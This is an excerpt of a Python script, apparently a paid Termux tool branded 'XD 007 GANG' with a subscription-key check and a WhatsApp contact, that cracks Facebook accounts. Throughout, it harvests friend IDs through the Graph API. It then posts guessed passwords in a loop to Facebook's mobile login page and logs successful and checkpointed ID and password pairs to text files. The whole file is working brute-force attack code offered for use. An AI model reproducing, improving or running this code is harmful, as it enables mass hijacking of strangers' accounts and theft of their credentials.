...
logo = "      Author      :     Rehan Adnan    \n'\x1b[1;92m'   Github      :     xd007here \n'\x1b[1;92m'   Owner OF     :     XD 007 GANG\n'\x1b[1;91m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;92m'   WAP NUMBER  :     +16282611588           \n"
dec = '2'
server = '2'
...
def main_apv():
    ...
    print logo
    try:
        key1 = open('/sdcard/.rehan.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '           You dont have subscrption'
        print '           Contact me on Whatsapp'                 
        print ''
        myid = uuid.uuid4().hex[:30]
        print '         YOUR KEY : ' + myid + imt
        kok = open('/sdcard/.rehan.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
        ...
        print ''
        print ''
        print '     Rehan Adnan The Name of Brand'
        raw_input('    Team Xd 007 ')
        os.system('xdg-open https://wa.me/+16282611588')
    ...
    if key1 in r1:
        ...
        raw_input('    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagao ')
        os.system('xdg-open https://wa.me/+16282611588')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In Rehanxd Paid Commands '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Rehan-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[Rehan-CP] ' + coc + user + ' | ' + pass1
                cp = open('rehan random-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From Rehan : ' + my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From zRehan : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('jok.txt', 'a')
    for i in z['data']:
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[IRehan-OK] ' + uid + ' | ' + pass1
                ok = open('Rehan-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[Rehan-CP] ' + uid + ' | ' + pass1
                cp = open('Rehan-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[Rehan-OK] ' + uid + ' | ' + pass2
                    ok = open('Rehan-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[Rehan-CP] ' + uid + ' | ' + pass2
                    cp = open('Rehan-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[Rehan-OK] ' + uid + ' | ' + pass3
                        ok = open('Rehan-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[Rehan-CP] ' + uid + ' | ' + pass3
                        cp = open('Rehan-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[Rehan-OK] ' + uid + ' | ' + pass4
                            ok = open('Rehan-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[IRehan-CP] ' + uid + ' | ' + pass4
                            cp = open('Rehan-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[Rehan-OK] ' + uid + ' | ' + pass5
                                ok = open('Rehan-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[Rehan-CP] ' + uid + ' | ' + pass5
                                cp = open('Rehan-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Rehan-OK] ' + uid + ' | ' + pass1
                ok = open('Rehan-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;91m[Rehan-CP] ' + uid + ' | ' + pass4
                            cp = open('Rehan-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;91m[IRehan-CP] ' + uid + ' | ' + pass5
                                cp = open('Rehan-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[Rehan-OK] ' + uid + ' | ' + pass6
                                    ok = open('Rehan-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[Rehan-CP] ' + uid + ' | ' + pass6
                                    cp = open('Rehan-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
